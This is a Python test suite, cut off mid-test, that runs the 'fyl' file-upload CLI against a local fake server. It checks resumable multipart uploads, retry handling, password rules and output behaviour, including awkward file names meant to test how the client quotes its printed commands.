"""Exercise the native fyl client against a local fake API (tests/fake_server.py)."""
import base64
from datetime import datetime, timezone
import hashlib
import json
import os
from pathlib import Path
import re
import resource
import select
import shlex
import signal
import stat
import subprocess
import sys
import tempfile
import termios
import threading
import time
import unittest
from http.server import ThreadingHTTPServer
import io
import shutil
import zipfile

from fake_server import LINK, MANAGE, OWNER_KEY, PROTECTED, TRANSFER_ID, UPLOAD_ID, Handler, State, b64url, resume_token, simulated, unb64url
from native import HOST, NATIVE, NO_BUILD, ROOT, VERSION, ciphertext_size, load_script, require_native

# The committed binaries of this version; native.NATIVE is this host's (or FYL_CLI_BINARY).
CLI = ROOT / 'dist' / 'cli' / VERSION

REFUSED = 'fyl: Upload failed (HTTP 400): Password must be 6 to 200 characters, without control characters.\n'
PROMPT, REPEAT = 'Password (press Enter to generate one): ', 'Repeat password: '
KEY_PROMPT = 'Key (or the whole link): '
CORRUPT = "fyl: The file is damaged or was changed. It can't be decrypted safely.\n"
WRONG_KEY = "fyl: This key doesn't open this file. Check that you copied the whole link.\n"
NO_KEY = 'fyl: This link has no key. Type the key at a terminal, or set FYL_KEY.\n'
CHANGED = 'fyl: The file changed since this upload started. Start a new upload.\n'
NO_STDOUT = ("fyl: An encrypted file isn't written to standard output: what was written couldn't be taken back if a later part failed "
             "to verify. Use -o with a folder or a file name.\n")
RULE = 'Password must be 6 to 200 characters, without control characters.'
VECTORS = ROOT / 'tests' / 'vectors' / 'e2ee'
# docs/FOLDER-ZIP.md: the vectors and the reference implementation that wrote them, which also writes their trees to disk.
FOLDER_VECTORS = ROOT / 'tests' / 'vectors' / 'folder-zip'
folder_zip = load_script('folder_zip')
FOLDER_CHANGED = 'fyl: The folder changed since this upload started. Start a new upload.\n'
GENERATED = r'[a-z]{3,5}-[a-z]{3,5}-[a-z]{3,5}-[0-9]{2}'


@unittest.skipIf(NATIVE is None, NO_BUILD)
class NativeClientTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        require_native()

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / 'home'
        self.root.mkdir()
        # Printed commands run as they would for a user: through a shell, with `fyl` on the PATH.
        self.bin = Path(self.tmp.name) / 'bin'
        self.bin.mkdir()
        (self.bin / 'fyl').symlink_to(NATIVE)
        self.state = State()
        self.server = ThreadingHTTPServer(('127.0.0.1', 0), Handler)
        self.server.state = self.state
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.origin = 'http://127.0.0.1:{}'.format(self.server.server_port)
        self.endpoint = self.origin + '/api/upload'
        self.state.origin = self.origin

    def reset(self):
        """A fresh server state, as for a new test."""
        self.state = self.server.state = State()
        self.state.origin = self.origin

    def tearDown(self):
        self.state.release.set()
        self.server.shutdown()
        self.server.server_close()
        self.thread.join()
        self.tmp.cleanup()

    def environment(self, **extra):
        # The update notice stays off unless a test turns it on (FYL_NO_UPDATE_CHECK=''): it would add a request.
        environment = {**os.environ, 'HOME': str(self.root), 'XDG_STATE_HOME': str(self.root / 'state'),
                       'PATH': '{}:{}'.format(self.bin, os.environ.get('PATH', '')), 'FYL_NO_UPDATE_CHECK': '1', **extra}
        for secret in ('FYL_PASSWORD', 'FYL_KEY', 'CI', 'XDG_CACHE_HOME'):
            if secret not in extra:
                environment.pop(secret, None)
        return environment

    def on_terminal(self, args, env=None, cwd=None):
        """Runs fyl with stderr on a terminal (stdout captured, stdin empty): the result and what the terminal showed."""
        master, slave = os.openpty()
        try:
            result = subprocess.run([str(NATIVE), *args], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=slave, text=True,
                                    env=self.environment(**(env or {})), timeout=60, cwd=cwd)
            shown = b''
            while select.select([master], [], [], 0.2)[0]:
                shown += os.read(master, 4096)
        finally:
            os.close(slave)
            os.close(master)
        return result, shown.decode()

    def run_raw(self, *args, input='', env=None, cwd=None):
        return subprocess.run([str(NATIVE), *args], capture_output=True, text=True, env=self.environment(**(env or {})), timeout=60, input=input, cwd=cwd)

    def run_cli(self, file, *args, env=None):
        return self.run_raw(str(file), '--endpoint', self.endpoint, *args, env=env)

    def run_tty(self, file, answers, *args, stderr=subprocess.PIPE):
        """Runs fyl --password with a terminal as its stdin and controlling terminal: see run_pty()."""
        return self.run_pty([str(file), '--password', '--endpoint', self.endpoint, *args], answers, stderr=stderr)

    def run_pty(self, args, answers, piped=None, stderr=subprocess.PIPE, env=None):
        """Runs fyl with a terminal as its controlling terminal and as stdin, or with `piped` on stdin and the terminal as
        stderr (`pbpaste | fyl download -`); stdout and otherwise stderr are captured. Types each answer once its prompt
        shows and the terminal stopped echoing, or sends it if it is a signal. Returns the result, everything the terminal
        showed, and whether it echoes and reads whole lines again afterwards."""
        master, slave = os.openpty()
        launch = ('import fcntl, os, sys, termios\nos.setsid()\ntty = os.open(sys.argv[1], os.O_RDWR)\n'
                  'fcntl.ioctl(tty, termios.TIOCSCTTY, 0)\nos.dup2(tty, 0 if sys.argv[2] == "stdin" else 2)\nos.execv(sys.argv[3], sys.argv[3:])\n')
        command = [str(NATIVE), *args]
        process = subprocess.Popen([sys.executable, '-I', '-c', launch, os.ttyname(slave), 'stdin' if piped is None else 'stderr', *command],
                                   stdin=subprocess.DEVNULL if piped is None else subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=stderr if piped is None else subprocess.DEVNULL, text=True, env=self.environment(**(env or {})),
                                   cwd=self.root)
        if piped is not None:
            process.stdin.write(piped)
            process.stdin.close()
        shown = b''

        def read(until, timeout=10):
            nonlocal shown
            deadline = time.monotonic() + timeout
            while not until() and time.monotonic() < deadline:
                if select.select([master], [], [], 0.02)[0]:
                    shown += os.read(master, 1024)
        try:
            # Only what the terminal showed after the last answer counts: right after an answer the previous prompt is
            # still the end of the output and the terminal still doesn't echo, so typing then would race the program
            # turning echo back on between two prompts.
            mark = 0
            for prompt, answer in answers:
                read(lambda prompt=prompt, mark=mark: shown[mark:].endswith(prompt.encode()) and not termios.tcgetattr(master)[3] & termios.ECHO)
                self.assertTrue(shown[mark:].endswith(prompt.encode()), shown)
                if isinstance(answer, signal.Signals):
                    process.send_signal(answer)
                else:
                    os.write(master, answer.encode())
                mark = len(shown)
            out, err = process.communicate(timeout=60) if piped is None else (process.stdout.read(), None)
            process.wait(timeout=60)
            read(lambda: False, timeout=0.2)
            echo = termios.tcgetattr(master)[3] & (termios.ECHO | termios.ICANON) == termios.ECHO | termios.ICANON
        finally:
            if process.poll() is None:
                process.kill()
                process.wait()
            for stream in (process.stdout, process.stderr):
                if stream:
                    stream.close()
            # Held open until here, so reading the terminal never fails before fyl has opened it.
            os.close(slave)
            os.close(master)
        return subprocess.CompletedProcess(process.args, process.returncode, out, err), shown.decode(), echo

    def rerun(self, command, cwd=None, input=None, env=None):
        return subprocess.run(['sh', '-c', command], capture_output=True, text=True, env=self.environment(**(env or {})), timeout=60,
                              cwd=cwd, input=input)

    def resume_command(self, stderr):
        """The --resume command an interrupted run printed last, and the `<uploadId>.<token>` it pipes to fyl."""
        command = stderr.strip().splitlines()[-1].strip()
        words = shlex.split(command)
        self.assertEqual((words[0], words[2:4], words[5:7]), ('echo', ['|', 'fyl'], ['--resume', '-']), command)
        return command, words[1]

    def fixture(self, content=b'fyl.at fixture'):
        file = self.root / "report & '旅行'.zip"
        file.write_bytes(content)
        return file

    def test_version_and_help(self):
        self.assertEqual(self.run_raw('--version').stdout, 'fyl {}\n'.format(VERSION))
        help_text = self.run_raw('--help').stdout
        self.assertIn('--manage', help_text)
        self.assertIn('fyl rm', help_text)
        self.assertIn('--resume', help_text)
        self.assertIn('--json', help_text)
        self.assertIn('--password           Require a password to download (FYL_PASSWORD for scripts)', help_text)
        self.assertIn('1-8', help_text)
        self.assertNotIn('fyler', help_text.lower())
        self.assertNotIn('receipt', help_text.lower())
        # 2.4.0: encryption is a normal option, and downloads have their commands.
        for text in ['--encrypt            Encrypt the file on this device before the upload.', 'fyl download LINK [-o PATH]',
                     'fyl decrypt FILE.age [-o PATH]', 'FYL_KEY', 'fyl FOLDER [options]', 'Sends the folder as one zip']:
            self.assertIn(text, help_text)
        hint = self.run_raw().stderr
        for text in (help_text, hint):
            for claim in ['preview', 'zero-knowledge', 'anonymous', '100 %', 'secure']:
                self.assertNotIn(claim, text.lower())
        self.assertIn('--encrypt', hint)
        self.assertIn('fyl download', hint)
        self.assertEqual(self.run_raw('download', '--help').stdout, help_text)

    def test_no_file_prints_a_start_hint_instead_of_an_error(self):
        result = self.run_raw()
        self.assertEqual((result.returncode, result.stdout), (2, ''))
        self.assertIn('fyl ./archive.zip', result.stderr)
        self.assertIn('--password', result.stderr)
        self.assertIn('fyl rm', result.stderr)
        self.assertNotIn('usage:', result.stderr)
        self.assertNotIn('error', result.stderr)
        missing = self.run_raw(str(self.root / 'missing.zip'))
        self.assertEqual(missing.returncode, 2)
        self.assertIn("fyl: Can't find", missing.stderr)

    def test_prints_only_the_link_and_the_management_link_on_request(self):
        file = self.fixture()
        quiet = self.run_cli(file)
        self.assertEqual((quiet.returncode, quiet.stdout, quiet.stderr), (0, LINK + '\n', ''))
        managed = self.run_cli(file, '--manage')
        self.assertEqual(managed.stdout, LINK + '\n' + MANAGE + '\n')
        self.assertEqual(managed.stderr, '')
        # Nothing is written to disk: HOME, with XDG_STATE_HOME inside it, still holds only the file.
        self.assertEqual(list(self.root.iterdir()), [file])

    def test_verbose_reports_expiry(self):
        verbose = self.run_cli(self.fixture(), '--expires', '1h', '--once', '--verbose')
        self.assertEqual(verbose.returncode, 0, verbose.stderr)
        self.assertEqual(verbose.stdout.count('\n'), 1)
        self.assertIn('Ready. Expires in 1 hour', verbose.stderr)
        self.assertIn('UTC', verbose.stderr)
        self.assertIn('One download only.', verbose.stderr)

    def test_parallel_multipart_retries_and_exact_parts(self):
        content = bytes(range(256)) * (51 * 1024 * 1024 // 256) + b'end'
        file = self.fixture(content)
        self.state.failures = {'/init': [503], '/part': [429], '/complete': [503]}
        result = self.run_cli(file, '--expires', '90m', '--once')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, LINK + '\n', ''))
        self.assertEqual(self.state.metadata['filename'], file.name)
        self.assertEqual(self.state.metadata['expiresIn'], 5400)
        self.assertIs(self.state.metadata['oneTime'], True)
        self.assertEqual(self.state.metadata['partSize'], 50 * 1024 * 1024)
        self.assertRegex(self.state.metadata['clientKey'], r'^[A-Za-z0-9_-]{43}$')
        self.assertEqual(len(self.state.init_keys), 1)
        self.assertNotIn(None, self.state.init_keys)
        chunk = 50 * 1024 * 1024
        expected = {n: (len(content[o:o + chunk]), hashlib.sha256(content[o:o + chunk]).hexdigest())
                    for n, o in enumerate(range(0, len(content), chunk), 1)}
        self.assertEqual(self.state.parts, expected)

    def test_permanent_part_error_aborts(self):
        self.state.failures = {'/part': [400]}
        result = self.run_cli(self.fixture(), '--workers', '1')
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertIn('fyl: Upload failed (HTTP 400): simulated failure', result.stderr)
        self.assertNotIn('DEBUG/ERROR', result.stderr)
        paths = [r[0] for r in self.state.requests]
        self.assertEqual(paths.count('/part'), 1)
        self.assertEqual(paths.count('/abort'), 1)
        self.assertNotIn('/complete', paths)

    def test_ctrl_c_keeps_the_upload_resumable(self):
        self.state.block = True
        process = subprocess.Popen([str(NATIVE), str(self.fixture()), '--endpoint', self.endpoint],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=self.environment())
        try:
            self.assertTrue(self.state.started.wait(10), 'Part upload did not start')
            process.send_signal(signal.SIGINT)
            out, err = process.communicate(timeout=15)
            self.assertEqual((process.returncode, out), (1, ''))
            self.assertIn('fyl: Upload paused.', err)
            # Without --manage the command carries the resume token, never the management key.
            key = self.state.metadata['clientKey']
            command, token = self.resume_command(err)
            self.assertEqual(token, UPLOAD_ID + '.' + resume_token(key))
            self.assertNotIn(key, err)
            self.assertNotIn('--manage', command)
            self.assertIn('Keep it private: it can cancel the upload, but not delete the file.', err)
            self.assertEqual(sum(r[0] == '/abort' for r in self.state.requests), 0)
            self.assertFalse(self.state.completed)
        finally:
            if process.poll() is None:
                process.kill()
                process.communicate()

    def test_interrupted_upload_resumes_with_only_the_missing_parts(self):
        content = os.urandom(50 * 1024 * 1024) + b'tail of the file'
        file = self.fixture(content)
        # Part 1 succeeds, part 2 keeps failing with a server error until the retries are used up.
        self.state.failures = {'/part': [200, 503, 503, 503]}
        first = self.run_cli(file, '--workers', '1', '--manage', '--json')
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        self.assertIn('Resume within 24 hours with the command below. Keep it private: it can also delete the upload.\n  echo ', first.stderr)
        command, token = self.resume_command(first.stderr)
        self.assertEqual(token, UPLOAD_ID + '.' + self.state.metadata['clientKey'], 'with --manage the command carries the key')
        # The key goes in on stdin, out of the process list, and the command keeps this run's options.
        self.assertTrue(command.endswith(" --resume - --manage --json --workers 1 --endpoint '{}'".format(self.endpoint)), command)
        self.assertEqual(sum(r[0] == '/abort' for r in self.state.requests), 0)
        sent_before = sum(r[0] == '/part' for r in self.state.requests)
        resumed = self.rerun(command)
        self.assertEqual(resumed.returncode, 0, resumed.stderr)
        self.assertEqual(json.loads(resumed.stdout)['managementUrl'], MANAGE)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests) - sent_before, 1, 'only part 2 is sent again')
        self.assertTrue(self.state.completed)
        self.assertEqual(self.run_cli(file, '--resume', 'not-a-token').returncode, 2)

    def interrupted(self, file, *args, env=None):
        """Runs an upload whose part keeps failing; returns its stderr, the printed command and its token."""
        self.state.failures = {'/part': [503, 503, 503]}
        result = self.run_cli(file, '--workers', '1', *args, env=env)
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        return (result.stderr, *self.resume_command(result.stderr))

    def test_resume_token_completes_without_the_management_link(self):
        file = self.fixture()
        err, _, token = self.interrupted(file)
        key = self.state.metadata['clientKey']
        self.assertEqual(token, UPLOAD_ID + '.' + resume_token(key))
        # The server derives the same token: tests/resume-token.test.ts pins this vector too.
        self.assertEqual(resume_token('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNO-_'), 'V6sO2to1wFlealOmFdn5p7nK8Ylb6xzK4pJCkCUmSm8')
        self.assertNotIn(key, err)
        resumed = self.run_cli(file, '--resume', token)
        self.assertEqual((resumed.returncode, resumed.stdout, resumed.stderr), (0, LINK + '\n', ''))
        self.assertTrue(self.state.completed)
        # The completed upload replays its receipt, and --manage can't get a management link with a resume token.
        managed = self.run_cli(file, '--resume', token, '--manage')
        self.assertEqual((managed.returncode, managed.stdout), (0, LINK + '\n'))
        self.assertEqual(managed.stderr, "fyl: The management link isn't available for this resume token.\n")
        as_json = self.run_cli(file, '--resume', token, '--manage', '--json')
        self.assertEqual(as_json.returncode, 0, as_json.stderr)
        self.assertNotIn('managementUrl', json.loads(as_json.stdout))
        self.assertTrue(all(data['key'] == resume_token(key) for path, _, data in self.state.requests if path == '/complete'))

    def test_a_resumed_run_prints_what_its_credential_can_do(self):
        file = self.fixture()
        _, _, owned = self.interrupted(file, '--manage')
        key = self.state.metadata['clientKey']
        # Resumed with the key but without --manage, the next interruption prints the resume token.
        err, command, token = self.interrupted(file, '--resume', owned)
        self.assertEqual(token, UPLOAD_ID + '.' + resume_token(key))
        self.assertNotIn(key, err)
        self.assertNotIn('--manage', command)
        self.assertIn('Keep it private: it can cancel the upload, but not delete the file.', err)
        # Resumed with the token and --manage, it says once, up front, that there is no management link.
        err, command, again = self.interrupted(file, '--resume', token, '--manage')
        self.assertTrue(err.startswith("fyl: The management link isn't available for this resume token.\n"), err)
        self.assertEqual(err.count('management link'), 1)
        self.assertEqual(again, token)
        self.assertNotIn('--manage', command)
        self.assertNotIn('can also delete', err)

    def test_a_file_named_like_an_option_or_rm_gets_a_working_resume_command(self):
        # Quoting keeps the name from the shell; ./ keeps fyl from reading it as an option or as the rm command.
        for name in ['-x.zip', 'rm', 'download', 'decrypt']:
            (self.root / name).write_bytes(b'fyl.at fixture')
            self.state.failures = {'/part': [503, 503, 503]}
            first = self.run_raw('--endpoint', self.endpoint, '--workers', '1', '--', name, cwd=self.root)
            self.assertEqual((first.returncode, first.stdout), (1, ''), first.stderr)
            command, _ = self.resume_command(first.stderr)
            self.assertIn(" | fyl './{}' --resume - ".format(name), command)
            resumed = self.rerun(command, cwd=self.root)
            self.assertEqual((resumed.returncode, resumed.stdout, resumed.stderr), (0, LINK + '\n', ''), name)
            self.assertEqual(self.state.metadata['filename'], name)

    def test_resume_token_cancels_an_upload_that_fails(self):
        file = self.fixture()
        _, _, token = self.interrupted(file)
        self.state.failures = {'/part': [400]}
        result = self.run_cli(file, '--resume', token)
        self.assertEqual((result.returncode, result.stdout), (1, ''))
        self.assertEqual([data for path, _, data in self.state.requests if path == '/abort'], [{'uploadId': UPLOAD_ID, 'key': token.split('.')[1]}])

    def test_a_resume_command_that_no_longer_works_says_so(self):
        file = self.fixture()
        _, _, token = self.interrupted(file)
        mistyped = token[:-1] + ('A' if token[-1] != 'A' else 'B')
        # Mistyped (403), closed within the 7 days the server remembers it (200) or after them (404): one answer.
        for status, credential in [(None, mistyped), ('expired', token), ('purged', token)]:
            self.state.status = status
            result = self.run_cli(file, '--resume', credential)
            self.assertEqual((result.returncode, result.stdout), (1, ''), status)
            self.assertEqual(result.stderr, 'fyl: This resume command no longer works (the upload expired, was cancelled or deleted, '
                                            'or the token is mistyped). Start a new upload.\n')
        self.assertEqual(sum(r[0] == '/abort' for r in self.state.requests), 0)

    def test_a_resumed_upload_keeps_its_lifetime_mode_and_name(self):
        file = self.fixture()
        _, _, token = self.interrupted(file)
        sent = sum(r[0] == '/part' for r in self.state.requests)
        for args in [('--expires', '3d'), ('--once',)]:
            result = self.run_cli(file, '--resume', token, *args)
            self.assertEqual((result.returncode, result.stdout), (2, ''), args)
            self.assertIn('A resumed upload keeps its lifetime and download mode (1 day, unlimited downloads).', result.stderr)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), sent)
        # The same lifetime is fine; another name is too, with a warning that the link keeps the original one.
        renamed = self.root / 'renamed.zip'
        renamed.write_bytes(file.read_bytes())
        result = self.run_cli(renamed, '--resume', token, '--expires', '1d')
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'), result.stderr)
        self.assertEqual(result.stderr, "fyl: Resuming the upload of '{0}' with 'renamed.zip'; the link keeps the name '{0}'.\n".format(file.name))

    def test_a_completed_upload_resumes_without_sending_parts(self):
        file = self.fixture()
        # The server completes the upload, but every reply to the completion is lost.
        self.state.failures = {'/complete': [503, 503, 503]}
        first = self.run_cli(file)
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        self.assertTrue(self.state.completed)
        command, _ = self.resume_command(first.stderr)
        # Edited since, at the same size: its parts no longer match, but the completion replays as it is.
        file.write_bytes(b'edited fixture')
        sent = sum(r[0] == '/part' for r in self.state.requests)
        resumed = self.rerun(command)
        self.assertEqual((resumed.returncode, resumed.stdout, resumed.stderr), (0, LINK + '\n', ''))
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), sent)

    def test_a_lost_completion_reply_is_asked_for_again(self):
        # The server completes the upload, but the connection drops before its reply, then the reply breaks off.
        self.state.garble = {'/complete': ['drop', 'cut']}
        result = self.run_cli(self.fixture(), '--manage', '--json', '--verbose')
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.count('\n'), 1)
        self.assertEqual(json.loads(result.stdout)['managementUrl'], MANAGE)
        self.assertEqual(result.stderr.count('No clear answer to the completion, asking again'), 2, result.stderr)
        paths = [r[0] for r in self.state.requests]
        self.assertEqual((paths.count('/complete'), paths.count('/status'), paths.count('/abort')), (3, 0, 0))

    def test_a_completion_that_stays_unclear_keeps_the_upload_resumable(self):
        # Every reply is broken: cut short, not JSON, without the transfer ID, or missing.
        file = self.fixture()
        self.state.garble = {'/complete': ['short', 'schema', 'cut', 'drop', 'short', 'schema', 'cut']}
        first = self.run_cli(file)
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        self.assertTrue(first.stderr.startswith("fyl: The upload may be complete, but its link didn't arrive intact. The command below gets it.\n"
                                                'Resume within 24 hours'), first.stderr)
        # Asked five more times, then the status said it completed, so once more; nothing was cancelled.
        paths = [r[0] for r in self.state.requests]
        self.assertEqual(paths[paths.index('/complete'):], ['/complete'] * 6 + ['/status', '/complete'])
        self.assertTrue(self.state.completed)
        resumed = self.rerun(self.resume_command(first.stderr)[0])
        self.assertEqual((resumed.returncode, resumed.stdout, resumed.stderr), (0, LINK + '\n', ''))

    def test_a_completion_the_status_calls_unfinished_keeps_the_upload_resumable(self):
        # Every reply to the completion is lost, then the status says the upload is still open: no further try,
        # nothing cancelled, and the printed command completes it.
        file = self.fixture()
        self.state.garble = {'/complete': ['drop'] * 6}
        self.state.status = 'uploading'
        first = self.run_cli(file)
        self.assertEqual((first.returncode, first.stdout), (1, ''))
        self.assertTrue(first.stderr.startswith('fyl: The upload did not complete. The command below completes it.\nResume within 24 hours'), first.stderr)
        paths = [r[0] for r in self.state.requests]
        self.assertEqual(paths[paths.index('/complete'):], ['/complete'] * 6 + ['/status'])
        self.state.status = None
        resumed = self.rerun(self.resume_command(first.stderr)[0])
        self.assertEqual((resumed.returncode, resumed.stdout, resumed.stderr), (0, LINK + '\n', ''))

    def test_retry_after_sets_the_pause_up_to_a_minute(self):
        file = self.fixture()
        # The server's seconds, plus up to a fifth, for parts as for the completion. A date isn't read: the usual pause.
        self.state.failures = {'/part': [(503, None, 3)], '/complete': [(503, None, 'Wed, 21 Oct 2015 07:28:00 GMT')]}
        started = time.monotonic()
        result = self.run_cli(file, '--verbose')
        elapsed = time.monotonic() - started
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'), result.stderr)
        waits = [int(n) for n in re.findall(r'^HTTP 503 from the server, retrying in (\d+)s \(1/2\)$', result.stderr, re.M)]
        self.assertTrue(len(waits) == 2 and 3 <= waits[0] <= 4 and waits[1] == 2, result.stderr)
        self.assertGreaterEqual(elapsed, 5)
        # 600 seconds wait one minute; fyl is stopped once it said so.
        self.state.failures = {'/init': [(503, None, 600)]}
        process = subprocess.Popen([str(NATIVE), str(file), '--endpoint', self.endpoint, '--verbose'],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=self.environment())
        timer = threading.Timer(20, process.kill)
        timer.start()
        try:
            line = next((line for line in process.stderr if 'retrying' in line), '')
        finally:
            timer.cancel()
            process.kill()
            process.communicate()
        self.assertEqual(line, 'HTTP 503 from the server, retrying in 60s (1/2)\n')

    def test_timeouts_busy_parts_and_dropped_connections_are_retried(self):
        file = self.fixture()
        self.state.failures = {'/part': [408, (503, 'part_busy')]}
        result = self.run_cli(file)
        self.assertEqual((result.returncode, result.stdout, result.stderr), (0, LINK + '\n', ''))
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), 3)
        self.state.garble = {'/part': ['drop']}
        result = self.run_cli(file, '--verbose')
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'), result.stderr)
        self.assertIn('Network error, retrying in', result.stderr)
        self.assertEqual(sum(r[0] == '/part' for r in self.state.requests), 5)
        self.assertNotIn('/abort', [r[0] for r in self.state.requests])

    def test_an_exhausted_part_is_never_retried(self):
        # part_limit is final with any status, a 429 too; Retry-After doesn't change that.
        for status in (409, 429):
            self.state.failures = {'/part': [(status, 'part_limit')]}
            sent = len(self.state.requests)
            result = self.run_cli(self.fixture(), '--workers', '1')
            self.assertEqual((result.returncode, result.stdout), (1, ''))
            self.assertEqual(result.stderr, 'fyl: Upload failed (HTTP {}): simulated failure\n'.format(status))
            self.assertEqual([r[0] for r in self.state.requests[sent:]], ['/init', '/part', '/abort'])

    @unittest.skipUnless(Path('/dev/full').exists(), 'no /dev/full')
    def test_a_full_stdout_moves_the_links_to_stderr(self):
        file, full = self.fixture(), 'fyl: Could not write to standard output: No space left on device (os error 28).\n'

        def run(*args, stdout=None, stderr=None):
            return subprocess.run([str(NATIVE), *args], stdout=stdout, stderr=stderr, text=True, env=self.environment(), timeout=60)
        for args, links in [((), [LINK]), (('--manage',), [LINK, MANAGE]), (('--json',), [LINK]), (('--json', '--manage'), [LINK, MANAGE])]:
            with open('/dev/full', 'w') as device:
                result = run(str(file), '--endpoint', self.endpoint, *args, stdout=device, stderr=subprocess.PIPE)
            self.assertEqual((result.returncode, result.stderr), (74, ''.join(link + '\n' for link in links) + full), args)
            self.assertTrue(self.state.completed)
        self.assertNotIn('/abort', [r[0] for r in self.state.requests])
        with open('/dev/full', 'w') as device:
            result = run('--version', stdout=device, stderr=subprocess.PIPE)
        self.assertEqual((result.returncode, result.stderr), (74, full))
        # A full stderr stops nothing: the upload finishes and prints its link, or an interrupted one exits as usual.
        with open('/dev/full', 'w') as device:
            result = run(str(file), '--endpoint', self.endpoint, '--verbose', stdout=subprocess.PIPE, stderr=device)
        self.assertEqual((result.returncode, result.stdout), (0, LINK + '\n'))
        self.state.failures = {'/part': [503, 503, 503]}
        with open('/dev/full', 'w') as device:
            result = run(str(file), '--endpoint', self.endpoint, '--verbose', stdout=subprocess.PIPE, stderr=device)
        self.assertEqual((result.returncode, result.stdout), (1, ''))

    def test_a_closed_stdout_moves_the_links_to_stderr(self):
        self.state.block = True
        process = subprocess.Popen([str(NATIVE), str(self.fixture()), '--endpoint', self.endpoint, '--manage'],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=self.environment())
        try:
            self.assertTrue(self.state.started.wait(10), 'Part upload did not start')
            # The reader is gone before the link is written, as in `fyl FILE | true`.
            process.stdout.close()
            self.state.release.set()
            with process.stderr:
                err = process.stderr.read()
            self.assertEqual(process.wait(timeout=15), 74, err)
        finally:
            if process.poll() is None:
                process.kill()
                process.communicate()
        self.assertEqual(err, LINK + '\n' + MANAGE + '\nfyl: Could not write to standard output: Broken pipe (os error 32).\n')
        self.assertTrue(self.state.completed)

    def test_json_prints_one_object_instead_of_the_links(self):
        file = self.fixture()
        # Leap days and the turn of a century check the calendar conversion.
        for expires_at in [951868799000, 4107542399000]:
            self.state.expires_at = expires_at
            result = self.run_cli(file, '--json', '--once')
            self.assertEqual((result.returncode, result.stdout.count('\n'), result.stderr), (0, 1, ''))
            self.assertEqual(json.loads(result.stdout), {
                'url': LINK, 'name': file.name, 'size': file.stat().st_size,
                'expiresAt': datetime.fromtimestamp(expires_at // 1000, timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ'), 'once': True})
        self.state.expires_at = 1793000000123
        managed = self.run_cli(file, '--json', '--manage')
        self.assertEqual(managed.stdout.count('\n'), 1)
        self.assertEqual(json.loads(managed.stdout), {
            'url': LINK, 'managementUrl': MANAGE,
            'name': file.name, 'size': file.stat().st_size, 'expiresAt': '2026-10-26T07:33:20Z', 'once': False})

    def test_a_password_from_fyl_password_is_sent_and_never_printed(self):
        file, secret = self.fixture(), 'correct horse 🐎'
        result = self.run_cli(file, '--password', '--json', '--verbose', env={'FYL_PASSWORD': secret})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.state.metadata['password'], secret)
        # Only a generated password is printed; the link of a protected upload has no name.
        self.assertEqual(json.loads(result.stdout), {
            'url': PROTECTED, 'name': file.name, 'size': file.stat().st_size,
            'expiresAt': '2026-10-26T07:33:20Z', 'once': False, 'protected': True})
        self.assertNotIn(secret, result.stdout + result.stderr)
        self.assertNotIn('Password:', result.stderr)
        quiet = self.run_cli(file, '--password', env={'FYL_PASSWORD': secret})
        self.assertEqual((quiet.returncode, quiet.stdout, quiet.stderr), (0, PROTECTED + '\n', ''))
        # FYL_PASSWORD alone protects nothing: --password asks for one.
        plain = self.run_cli(file, env={'FYL_PASSWORD': secret})
        self.assertEqual((plain.returncode, plain.stdout, plain.stderr), (0, LINK + '\n', ''))
        self.assertNotIn('password', self.state.metadata)

    def test_control_characters_are_refused_before_anything_is_sent(self):
        file = self.fixture()
        # In the server's words: one rule everywhere.
        for password in ['tab\tinside', 'line\nbreak', 'del\x7fete', 'escape\x1b[31m', 'c1 \x85 control']:
            result = self.run_cli(file, '--password', env={'FYL_PASSWORD': password})
            self.assertEqual((result.returncode, result.stdout, result.stderr),
                             (2, '', 'fyl: Password must be 6 to 200 characters, without control characters.\n'), repr(password))
        # Without a terminal to ask on, FYL_PASSWORD is the only way; the password never goes on the command line.
        result = self.run_cli(file, '--password')
        self.assertEqual((result.returncode, result.stdout, result.stderr), (2, '', 'fyl: --password needs a terminal to ask on, or FYL_PASSWORD.\n'))
        result = self.run_cli(file, '--password=hunter22')
        self.assertEqual((result.returncode, result.stdout), (2, ''))
        self.assertIn('fyl: --password takes no value.', result.stderr)
        self.assertEqual(self.state.requests, [])

    def test_the_server_judges_a_passwords_length(self):
        # The server counts characters after NFC, which fyl can't without Unicode tables, so it never counts them
        # itself: 150 decomposed é are 300 code points but a valid password, 101 U+0958 expand to 202 in NFC.
        file = self.fixture()
        for password in ['', 'five5', 'x' * 201, 'ä' * 201, 'क़' * 101]:
            result = self.run_cli(file, '--password', env={'FYL_PASSWORD': password})
            self.assertEqual((result.returncode, result.stdout, result.stderr), (1, '', REFUSED), repr(password))
        self.assertEqual({path for path, _, _ in self.state.requests}, {'/init'})
        for password in ['sixsix', 'ä' * 200, 'x' * 200, 'é' * 150, 'क़' * 100]:
            result = self.run_cli(file, '--password', env={'FYL_PASSWORD': password})
            self.assertEqual((result.returncode, result.stdout), (0, PROTECTED + '\n'), result.stderr)
            self.assertEqual(self.state.metadata['password'], password)

    def test_every_password_the_server_accepts_gets_through(self):
        vectors = ROOT / 'tests' / 'vectors' / 'passwords.json'
        if not vectors.is_file():
            self.skipTest('no tests/vectors/passwords.json')
        file, accepted = self.fixture(), 0
